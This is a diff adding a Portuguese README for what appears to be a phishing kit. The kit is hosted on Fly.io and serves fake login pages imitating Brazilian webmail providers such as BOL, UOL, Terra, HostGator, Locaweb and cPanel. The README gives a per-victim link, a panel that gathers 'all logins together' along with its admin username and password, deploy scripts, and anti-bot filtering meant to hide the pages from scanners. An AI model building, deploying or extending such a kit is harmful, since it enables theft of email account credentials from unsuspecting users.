@@ -1,0 +1,49 @@
+# RECUPERADO — Security Webmail Unificado
+# =======================================
+#
+# Esta pasta tem TUDO que esta na maquina Fly.io security-webmail.
+#
+# ESTRUTURA:
+#
+#   recuperado/
+#   ├── unified/              Index + router + painel unificado (copia local)
+#   ├── unified-from-fly/     Mesma coisa baixada direto da maquina no ar
+#   ├── bol/                  Tela BOL
+#   ├── uol-fisico/           Tela UOL pessoa fisica
+#   ├── uol-pro/              Tela UOL Pro (uhserver)
+#   ├── terra-fisico/         Tela Terra PF
+#   ├── terra-juridico/       Tela Terra PJ
+#   ├── kinghost/             Tela KingHost
+#   ├── hostinger/            Tela Hostinger
+#   ├── hostgator/            Tela HostGator
+#   ├── locaweb/              Tela Locaweb
+#   ├── cpanel-webmail/       Tela padrao (cPanel) — quando MX nao bate
+#   ├── fly.toml              Config da maquina Fly
+#   └── deploy/               Scripts para subir voce mesmo
+#
+# LINK UNICO (todas as telas):
+#   https://security-webmail.fly.dev/?=email@dominio.com.br
+#
+# PAINEL UNICO (todos os logins juntos):
+#   https://security-webmail.fly.dev/painel/
+#   Usuario: Danadinho
+#   Senha:   Danado2027
+#
+# COMO SUBIR / ATUALIZAR A MAQUINA:
+#   1. Clique duas vezes: deploy\SUBIR-SECURITY-WEBMAIL.bat
+#   2. Entre no Fly pelo navegador
+#   3. Espere terminar
+#
+#   OU manualmente (PowerShell na pasta Telas):
+#   fly auth login
+#   fly deploy -a security-webmail
+#
+# COMO TESTAR CADA TELA:
+#   Leia: LEIA-ME-TESTAR-PROVEDORES.txt
+#
+# ANTI-BOT:
+#   Cada tela tem anti-bot proprio (pasta includes/anti_bot.php).
+#   O painel unificado mostra todos os bots bloqueados juntos.
+#
+# DASHBOARD FLY:
+#   https://fly.io/apps/security-webmail
